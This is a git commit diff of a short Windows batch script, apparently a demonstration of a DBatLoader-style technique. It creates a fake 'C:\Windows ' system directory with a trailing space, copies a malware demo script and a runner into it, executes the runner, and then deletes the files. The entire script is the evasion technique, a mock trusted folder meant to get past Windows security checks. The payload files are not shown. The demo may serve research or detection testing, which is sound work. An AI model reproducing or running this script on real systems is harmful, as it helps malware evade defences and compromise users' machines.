1f432c976d05d6ce6e44da69a8a58f086d7117a4
Marcus Ruffin <mjruffin@gmail.com>
2025-03-23 14:18:29 -0400

    Update DbatLoaderDemo.bat

--- DbatLoaderDemo.bat
+++ DbatLoaderDemo.bat
@@ -1,6 +1,7 @@
+@echo off
 mkdir "\\?\C:\Windows "
 mkdir "\\?\C:\Windows \System32"
-ECHO F|xcopy "malwaredemo.exe" "C:\Windows \System32\" /K /D /H /Y
+ECHO F|xcopy "malwaredemo.ps1" "C:\Windows \System32\" /K /D /H /Y
 ECHO F|xcopy "malwarerunner.bat" "C:\Windows \System32\" /K /D /H /Y
 "C:\Windows \System32\malwarerunner.bat"
 del /q "C:\Windows \System32\*"
